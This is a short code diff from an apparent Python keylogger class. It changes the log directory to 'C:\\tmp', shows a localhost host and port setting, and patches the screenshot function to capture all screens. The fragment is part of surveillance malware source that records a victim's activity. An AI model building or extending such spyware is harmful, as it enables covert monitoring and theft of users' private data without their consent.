@@ -40,7 +40,7 @@ class Keylogger:
         self.host = "127.0.0.1"
         self.port = 1005
 
-        self.log_directory = "tmp" #"C:\\tmp"
+        self.log_directory = "C:\\tmp"
 
         ImageGrab.grab = partial(ImageGrab.grab, all_screens=True) # Take Screenshots of all Screens at once
 
